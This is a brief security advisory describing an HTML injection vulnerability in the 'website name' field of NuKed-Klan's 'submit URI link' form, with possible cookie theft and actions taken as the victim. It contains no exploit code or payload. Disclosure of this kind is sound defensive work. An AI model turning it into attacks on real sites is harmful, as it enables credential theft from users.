NuKed-Klan 'submit URI link' function is reported prone to a HTML injection vulnerability. It is reported that the issue exists due to a lack of sufficient input validation performed on the 'website name' input field of the NuKed-Klan submit URI link form.

Attackers may potentially exploit this issue to manipulate web content or to steal cookie-based authentication credentials. It may also be possible to take arbitrary actions as the victim user.
